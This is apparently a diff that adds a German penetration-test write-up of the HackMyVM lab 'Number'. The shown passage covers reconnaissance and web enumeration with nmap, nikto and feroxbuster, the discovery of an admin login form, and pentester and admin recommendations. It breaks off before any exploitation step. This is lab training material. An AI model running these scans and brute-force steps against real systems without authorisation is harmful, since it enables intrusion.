@@ -1,1 +1,958 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Number - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Number - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+  
+    <div class="header-bg">
+        <h1>Number - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">crunch</div>
+                <div class="tool-item">wc</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">hping3</div>
+                <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken. -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">192.168.2.37</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl dient dazu, aktive Hosts im lokalen Netzwerksegment zu identifizieren. Ich verwende <code>arp-scan</code> mit dem Parameter <code>-l</code>, um das lokale Netzwerk zu scannen. Die Ausgabe pipe ich dann an <code>grep "PCS"</code>, um Zeilen zu filtern, die 'PCS' enthalten, was oft auf VirtualBox-Hardware hindeutet. Mit <code>awk '{print $1}'</code> extrahiere ich das erste Feld der gefilterten Zeile, welches die IP-Adresse ist. Für Laien: Ich durchsuche mein lokales Netzwerk nach Computern und finde die IP-Adresse eines bestimmten Geräts anhand seiner Hardware-Informationen. Für Experten: Standardmethode zur schnellen Host-Entdeckung im lokalen Subnetz.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Identifizierung der IP-Adresse <code>192.168.2.37</code> liefert das Zielsystem für den weiteren Pentest. Es bestätigt, dass das Ziel im selben Netzwerksegment liegt und aktiv ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese IP-Adresse ist nun unser Fokus. Wir werden im nächsten Schritt detailliertere Scans durchführen, um offene Dienste und potenzielle Angriffsvektoren zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, welche Geräte in Ihrem Netzwerksegment aktiv sind und identifizieren Sie unbekannte Hardware. Stellen Sie sicher, dass nur autorisierte Systeme verbunden sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+         <span class="command">192.168.2.37 number.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich füge einen Eintrag in die lokale Datei <code>/etc/hosts</code> auf meinem Kali-System ein, um der gefundenen IP-Adresse <code>192.168.2.37</code> den Hostnamen <code>number.hmv</code> zuzuweisen. Dies vereinfacht die Adressierung des Zielsystems in nachfolgenden Befehlen. Für Laien: Ich gebe der gefundenen IP-Adresse einen einfachen Namen auf meinem Computer, damit ich sie leichter verwenden kann. Für Experten: Gängige Praxis zur Verbesserung der Lesbarkeit und Verwaltung von Zielen während eines Pentests.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche Hinzufügen des Eintrags ist eine kleine, aber nützliche Vorbereitung. Es hat keine Auswirkungen auf das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Hostnamen <code>number.hmv</code> in allen weiteren Befehlen.<br><strong>Empfehlung (Admin):</strong> Keine Auswirkungen auf das Zielsystem. Relevant für die Organisation des Pentestenden.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Beginn Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://number.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.37</span>
+<span class="command">+ Target Hostname:    number.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-11 15:32:15 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: nginx/1.14.2</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /admin/: This might be interesting.</span>
+<span class="password">+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.</span>
+<span class="password">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+<span class="command">+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-11 15:32:23 (GMT2) (8 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze <code>nikto</code> ein, um den Nginx-Webserver auf Port 80 (Hostname <code>number.hmv</code>) auf bekannte Schwachstellen, Konfigurationsfehler und interessante Pfade zu prüfen. Für Laien: Ich lasse ein Programm die Webseite auf Port 80 nach bekannten 'Problemstellen' durchsuchen. Für Experten: Nikto ist ein schnelles Werkzeug für die automatisierte Web-Enumeration. Es identifiziert oft fehlende Sicherheits-Header und das Vorhandensein potenziell sensibler Dateien oder interessanter Verzeichnisse.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ausgabe liefert mehrere wichtige Hinweise. Sie bestätigt den Nginx/1.14.2 Server und weist auf fehlende Sicherheits-Header hin. Besonders interessant sind die Funde des Verzeichnisses <code>/admin/</code> und der Datei <code>/admin/index.php</code>, die als 'interessant' markiert sind. Der Hinweis auf <code>/#wp-config.php#</code> ist wahrscheinlich ein False Positive, aber das Admin-Verzeichnis ist ein klares Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Verzeichnis <code>/admin/</code> und insbesondere <code>/admin/index.php</code> sind primäre Ziele für die weitere Untersuchung. Ich werde versuchen, auf diese Pfade zuzugreifen und ihre Funktionalität zu verstehen, da sie oft Anmeldeformulare oder andere administrative Funktionen enthalten. Die fehlenden Sicherheits-Header sind sekundär, aber nützlich für den Bericht.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie essentielle Sicherheits-Header. Überprüfen Sie, ob temporäre oder Backup-Dateien (wie solche mit `#` am Anfang und Ende) im Webroot liegen und zugänglich sind. Sichern Sie Admin-Verzeichnisse und beschränken Sie den Zugriff darauf.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.37 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    nginx 1.14.2</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen Nmap-Scan mit Filterung durch, um schnell die offenen Ports zu identifizieren. Die verwendeten Flags sind <code>-sS</code> (SYN-Scan), <code>-sC</code> (Standard-Skripte), <code>-sV</code> (Versionserkennung), <code>-p-</code> (alle Ports), <code>-T5</code> (aggressives Timing) und <code>-AO</code> (OS-Erkennung). Die Ausgabe wird an <code>grep open</code> gepipet. Für Laien: Ich klopfe an alle 'Türen' des Computers und sehe nach, welche offen sind und welche Programme dahinterstecken, nur die offenen zeige ich mir an. Für Experten: Schnelle Identifizierung der offenen Angriffsfläche. Die Flags ermöglichen eine umfassende Enumeration.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nur zwei Ports sind offen: Port 22 mit einem SSH-Dienst (OpenSSH 7.9p1) und Port 80 mit einem HTTP-Dienst (nginx 1.14.2). Dies ist eine kleine Angriffsfläche.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir konzentrieren uns nun auf die detaillierte Enumeration dieser beiden Dienste.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur absolut notwendige Dienste für externe Verbindungen geöffnet sind. Überprüfen Sie die Konfiguration von SSH und Nginx.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.37</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 15:31 CEST</span>
+<span class="command">Nmap scan report for number.hmv (192.168.2.37)</span>
+<span class="password">Host is up (0.00012s latency).</span>
+Not shown: <span class="command">65533 closed tcp ports (reset)</span>
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey:</span>
+<span class="command">|   2048 2f:90:c5:7c:a1:62:89:3a:ec:ea:c3:51:fa:77:f8:3f (RSA)</span>
+<span class="command">|   256 8e:21:71:85:04:3d:a7:db:1d:e6:6f:16:27:0c:0d:c9 (ECDSA)</span>
+<span class="command">|_  256 e2:39:c7:eb:f2:6d:53:0f:fd:3c:2c:05:31:c9:5b:f2 (ED25519)</span>
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+<span class="command">|_http-title: Site doesn't have a title (text/html).</span>
+<span class="command">|_http-server-header: nginx/1.14.2</span>
+<span class="command">MAC Address: 08:00:27:E0:C4:B3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.12 ms number.hmv (192.168.2.37)</span>
+
+<span class="password">OS and Service detection performed. Please report any incorrect results at https://nmap.org/cgi-bin/submit.cgi?new-service .</span>
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des Nmap-Scans auf dem Zielsystem. Sie enthält die detaillierten Informationen zu den offenen Diensten auf den Ports 22 (SSH) und 80 (Nginx), die genauen Versionsnummern (OpenSSH 7.9p1, nginx 1.14.2), SSH-Hostkeys, HTTP-Header, MAC-Adresse (VirtualBox), geschätztes Betriebssystem (Linux), und Latenzinformationen. Für Laien: Das ist der komplette 'Gesundheits-Check' des Computers, der mir alle Details zu den offenen 'Türen' (Diensten) und dem 'Typ' des Computers (Betriebssystem) liefert. Für Experten: Die genauen Versionsnummern und die OS-Erkennung sind entscheidend für die Recherche nach spezifischen Schwachstellen (CVEs). Die Nginx-Version 1.14.2 ist bekannt und relativ alt. Die MAC-Adresse identifiziert die Umgebung als VirtualBox.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die vollständige Nmap-Ausgabe liefert alle notwendigen Details für die Recherche nach versionsspezifischen Schwachstellen in OpenSSH 7.9p1 und nginx 1.14.2. Die Nginx-Version ist potenziell anfällig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie bekannte Schwachstellen für OpenSSH 7.9p1 und nginx 1.14.2. Die Nginx-Version 1.14.2 sollte besonders aufmerksam geprüft werden. Beginnen Sie die detaillierte Enumeration des Nginx-Webservers.<br><strong>Empfehlung (Admin):</strong> Halten Sie die Software auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Nginx 1.14.2 ist eine ältere Version und sollte aktualisiert werden. Minimieren Sie die Informationen, die durch Server-Header und OS-Erkennung preisgegeben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">x=$(curl number.hmv -Iv -s| grep "Content-Length"); clear;p=$(echo $x | awk {'print $2'})</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password"> ...</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist eine Kombination aus <code>curl</code> und Shell-Befehlen, um die Content-Length des HTTP-Response von der Hauptseite (<code>http://number.hmv</code>) zu extrahieren und in einer Shell-Variable zu speichern. <code>curl number.hmv -Iv -s</code> sendet eine HEAD-Anfrage (<code>-I</code>) mit verbose-Ausgabe (<code>-v</code>) an die Hauptseite, unterdrückt die Fortschrittsanzeige (<code>-s</code>). Die gesamte Ausgabe wird dann an <code>grep "Content-Length"</code> gepipet, um die Zeile mit der Content-Length zu finden. Diese Zeile wird in der Variable <code>x</code> gespeichert. Danach wird der Bildschirm mit <code>clear</code> gelöscht. Schließlich wird der Inhalt von <code>x</code> an <code>echo</code> übergeben, das Ergebnis an <code>awk {'print $2'}</code> gepipet, um das zweite Feld (den Zahlenwert der Content-Length) zu extrahieren, und dieses Ergebnis wird in der Variable <code>p</code> gespeichert. Für Laien: Ich frage die Webseite auf der Hauptadresse (number.hmv) nach der Größe des Inhalts, ohne den Inhalt selbst herunterzuladen. Dann speichere ich diese Größe in einer 'Notiz' (einer Variable auf meinem Computer). Für Experten: Die Extraktion der Content-Length ist oft nützlich, um Blind-Schwachstellen zu identifizieren, bei denen die Antwortgröße von der Gültigkeit einer Bedingung abhängt (z.B. in Blind SQL Injection oder Blind XXE). Hier scheint es Teil eines Skripts oder einer Methode zu sein, um die normale Antwortgröße zu ermitteln, um sie später für solche Blind-Techniken als Vergleichswert zu nutzen. Die Verwendung von Shell-Variablen und Pipes ist Standard in der Skripting-Umgebung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt dient der Vorbereitung auf potenzielle Blind-Schwachstellen-Tests, indem die Standard-Content-Length der Antwort extrahiert wird. Er liefert noch keine direkten Hinweise auf Schwachstellen, zeigt aber die angewandte Methodik.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die extrahierte Content-Length kann später bei Blind-Tests als Referenzwert verwendet werden. Konzentrieren Sie sich nun auf die aktive Enumeration der Webanwendung.<br><strong>Empfehlung (Admin):</strong> Standard-Verhalten des Webservers. Keine direkten Sicherheitsimplikationen, aber Teil einer Reconnaissance-Technik.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Fortsetzung Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://number.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password"> ___  ___  __   __     __      __         __   ___</span>
+<span class="password">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="password">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="password">───────────────────────────┬──────────────────────</span>
+ <span class="command">🎯  Target Url            │ http://number.hmv</span>
+ <span class="command">🚀  Threads               │ 50</span>
+ <span class="command">📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+ <span class="command">👌  Status Codes          │ [200, 301, 302]</span>
+ <span class="command">💥  Timeout (secs)        │ 7</span>
+ <span class="command">🦡  User-Agent            │ feroxbuster/2.11.0</span>
+ <span class="command">💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ <span class="command">🔎  Extract Links         │ true</span>
+ <span class="command">💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ <span class="command">🏁  HTTP methods          │ [GET]</span>
+ <span class="command">🔃  Recursion Depth       │ 4</span>
+<span class="password">───────────────────────────┴──────────────────────</span>
+ <span class="password">🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="password">──────────────────────────────────────────────────</span>
+<span class="command">200      GET        1l        2w       11c http://number.hmv/</span>
+<span class="command">200      GET        1l        2w       11c http://number.hmv/index.html</span>
+<span class="command">301      GET        7l       12w      185c http://number.hmv/admin => http://number.hmv/admin/</span>
+<span class="command">200      GET        1l        1w        5c http://number.hmv/admin/admincheck.php</span>
+<span class="command">200      GET       12l       31w      412c http://number.hmv/admin/index.php</span>
+<span class="command">200      GET        1l        1w       11c http://number.hmv/robots.txt</span>
+<span class="command">200      GET        1l        3w       19c http://number.hmv/admin/command.php</span>
+<span class="command">301      GET        7l       12w      185c http://number.hmv/pin => http://number.hmv/pin/</span>
+<span class="command">200      GET        1l        2w       10c http://number.hmv/pin/pincheck.php</span>
+<span class="command">200      GET       10l       29w      319c http://number.hmv/pin/index.php</span>
+<span class="command">200      GET        1l        5w       27c http://number.hmv/pin/whoami.php</span>
+<span class="password">[####################] - 19m  18526004/18526004 0s      found:11      errors:150</span>
+<span class="password">[####################] - 19m  6175316/6175316 5454/s  http://number.hmv/</span>
+<span class="password">[####################] - 19m  6175316/6175316 5450/s  http://number.hmv/admin/</span>
+<span class="password">[####################] - 18m  6175316/6175316 5614/s  http://number.hmv/pin/</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>feroxbuster</code>, um Verzeichnisse und Dateien auf dem Nginx-Webserver auf Port 80 (<code>http://number.hmv</code>) zu brute-forcen. Ich verwende eine mittelgroße Wortliste und suche nach einer breiten Palette von Dateierweiterungen. Ich beschränke die Ergebnisse auf die Statuscodes 200, 301 und 302. Für Laien: Ich lasse ein schnelles Programm viele Namen für Webseiten-Ordner und -Dateien ausprobieren, um versteckte Inhalte zu finden. Für Experten: Feroxbuster ist ein effektives Werkzeug zur Web-Enumeration. Die Kombination von Wortliste und Extensions erhöht die Chance, versteckte Ressourcen zu finden. Das Filtern auf spezifische Statuscodes ist wichtig, um Rauschen in den Ergebnissen zu reduzieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Feroxbuster findet eine Reihe interessanter Endpunkte: <code>/</code>, <code>/index.html</code> (beide Status 200, sehr kleine Größe 11c), die Verzeichnisse <code>/admin/</code> und <code>/pin/</code> (beide Status 301, Weiterleitung auf das Verzeichnis), und verschiedene Dateien innerhalb dieser Verzeichnisse (<code>/admin/admincheck.php</code>, <code>/admin/index.php</code>, <code>/robots.txt</code>, <code>/admin/command.php</code>, <code>/pin/pincheck.php</code>, <code>/pin/index.php</code>, <code>/pin/whoami.php</code>, alle Status 200). Die Verzeichnisse <code>/admin/</code> und <code>/pin/</code> sind besonders interessant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die gefundenen Verzeichnisse und Dateien manuell untersuchen. Insbesondere die Pfade im <code>/admin/</code> und <code>/pin/</code> Verzeichnis, sowie <code>/robots.txt</code> (oft ein Hinweis auf interessante Pfade) und <code>/admin/command.php</code> (klingt nach einer Befehlsausführungsfunktion) und <code>/pin/pincheck.php</code> / <code>/pin/index.php</code> (deuten auf eine PIN-basierte Authentifizierung hin).<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Webserver-Logs auf Brute-Force-Versuche wie diesen. Überprüfen Sie die Zugänglichkeit von Admin-Verzeichnissen und entfernen oder schützen Sie unnötige Dateien (wie robots.txt, wenn sie sensitive Informationen preisgeben).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/robots.txt</span>
+
+<span class="password">whoami.php</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich greife auf die Datei <code>/robots.txt</code> auf dem Webserver zu. Diese Datei wird von Webcrawlern gelesen, um zu erfahren, welche Bereiche einer Website nicht indexiert werden sollen, kann aber auch Hinweise für Angreifer enthalten. Die Ausgabe zeigt den Inhalt der Datei: einfach die Zeichenkette <code>whoami.php</code>. Für Laien: Ich schaue in eine spezielle Datei, die Suchmaschinen sagt, wo sie nicht hinschauen sollen. Manchmal steht da auch etwas anderes Interessantes drin. Hier steht nur der Name einer anderen Webseite-Datei: <code>whoami.php</code>. Für Experten: Das Auflisten einer Datei in <code>robots.txt</code> deutet oft darauf hin, dass der Entwickler möchte, dass diese Datei nicht öffentlich bekannt wird (für Suchmaschinen), was sie für einen Angreifer interessant macht. Das Vorhandensein von <code>whoami.php</code> im Root-Verzeichnis (da kein anderer Pfad angegeben ist) ist ein Hinweis auf eine potenziell interessante Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Inhalt von <code>/robots.txt</code> liefert den Namen einer potenziell interessanten Datei: <code>whoami.php</code>. Diese Datei könnte Informationen über den Webserver-Benutzer preisgeben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde versuchen, auf die Datei <code>http://number.hmv/whoami.php</code> zuzugreifen, um ihren Inhalt zu sehen.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie <code>robots.txt</code> nur für seinen beabsichtigten Zweck. Listen Sie keine sensiblen Dateien oder Pfade auf, auch wenn Sie nicht möchten, dass Suchmaschinen sie indexieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/whoami.php</span>
+
+<span class="command">404 Not Found</span>
+<span class="command">nginx/1.14.2</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, auf die in <code>robots.txt</code> gefundene Datei <code>http://number.hmv/whoami.php</code> zuzugreifen. Die Antwort des Servers ist <code>404 Not Found</code>. Für Laien: Ich habe versucht, die Webseite-Datei <code>whoami.php</code> zu besuchen, aber der Computer hat gesagt, dass er sie nicht finden kann. Für Experten: Ein 404-Fehler bedeutet, dass die angeforderte Ressource auf dem Server nicht gefunden wurde. Obwohl <code>robots.txt</code> die Datei auflistet, scheint sie entweder nicht (mehr) unter diesem Pfad zu existieren, oder es gibt eine andere Konfiguration, die den Zugriff verhindert. Dies ist etwas unerwartet, da sie in <code>robots.txt</code> genannt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei <code>whoami.php</code> ist unter dem erwarteten Pfad nicht zugänglich. Dies eliminiert diesen spezifischen Hinweis als direkten Angriffsvektor im Moment.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl der direkte Zugriff fehlschlägt, notieren Sie den Dateinamen. Möglicherweise existiert er unter einem anderen Pfad (z.B. innerhalb von <code>/admin/</code> oder <code>/pin/</code>) oder wird auf eine andere Weise verwendet. Konzentrieren Sie sich nun auf die anderen gefundenen interessanten Pfade.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass <code>robots.txt</code> keine veralteten oder falschen Informationen enthält.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">view-source:http://number.hmv/admin/index.php</span>
+<span class="password">LOGIN</span>
+
+ <span class="command">form action="admincheck.php" method="post"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche den Quellcode der Datei <code>/admin/index.php</code> im <code>/admin/</code> Verzeichnis, das von Nikto und Feroxbuster gefunden wurde. Der Quellcode zeigt eine einfache HTML-Seite mit dem Titel "LOGIN" und einem Formular. Das Formular sendet Daten (<code>method="post"</code>) an das Skript <code>admincheck.php</code>. Für Laien: Ich schaue mir die Seite im Ordner <code>/admin</code> an und finde dort eine Anmeldeseite. Der Bauplan der Seite zeigt, dass man Benutzername und Passwort in ein Formular eingeben kann, und das Programm <code>admincheck.php</code> prüft dann, ob sie richtig sind. Für Experten: Die Identifizierung eines Login-Formulars ist Standard bei der Web-Enumeration. Das Formular auf <code>/admin/index.php</code> sendet die Anmeldedaten an <code>admincheck.php</code> mittels POST. Dies ist der Zugangspunkt zum Admin-Bereich, der Brute-Force-Angriffe oder die Suche nach Anmeldedaten erfordert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Anmeldeformular für den Admin-Bereich wurde gefunden. Dies ist ein wichtiger Zugangspunkt, der die Kompromittierung von Anmeldedaten (durch Brute-Force, Wörterbuchangriffe oder das Ausnutzen anderer Schwachstellen) erfordert, um Zugriff auf den Admin-Bereich zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Anmeldedaten für dieses Formular zu finden. Dies könnte durch Brute-Force-Angriffe auf das Formular oder durch das Auslesen von Anmeldedaten aus anderen Quellen geschehen, falls solche gefunden werden. Überprüfen Sie auch den Quellcode von <code>admincheck.php</code>, falls zugänglich, auf Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Schützen Sie Admin-Bereiche durch starke Authentifizierung (komplexe Passwörter, Multi-Faktor-Authentifizierung). Implementieren Sie Ratenbegrenzung und Lockout-Mechanismen gegen Brute-Force-Angriffe. Überwachen Sie fehlgeschlagene Anmeldeversuche.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://number.hmv/admin/admincheck.php</span>
+
+<span class="command">No...</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich rufe das Skript <code>admincheck.php</code> direkt auf, wahrscheinlich ohne POST-Parameter, um zu sehen, wie es reagiert. Die Antwort ist einfach 'No...'. Für Laien: Ich habe das Programm, das die Anmeldedaten prüft, direkt angesprochen, ohne Benutzername und Passwort einzugeben. Es hat einfach nur 'No...' geantwortet. Für Experten: Der direkte Aufruf von <code>admincheck.php</code> ohne die erwarteten POST-Parameter führt zu einer einfachen 'No...' Antwort. Dies bestätigt, dass das Skript existiert und ausgeführt wird, aber keine detaillierten Fehlermeldungen oder Informationen preisgibt, was die Black-Box-Analyse des Anmeldevorgangs erschwert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <code>admincheck.php</code> gibt eine generische Fehlermeldung zurück, was die Informationsbeschaffung durch direkte Anfragen erschwert. Die Black-Box-Analyse oder das Brute-Forcing des Anmeldeformulars sind weiterhin notwendig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich darauf, das Anmeldeformular mit Wörterlisten anzugreifen oder Anmeldedaten aus anderen Quellen zu finden.<br><strong>Empfehlung (Admin):</strong> Eine generische Fehlermeldung ist besser als detaillierte Informationen preiszugeben, die einem Angreifer helfen könnten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
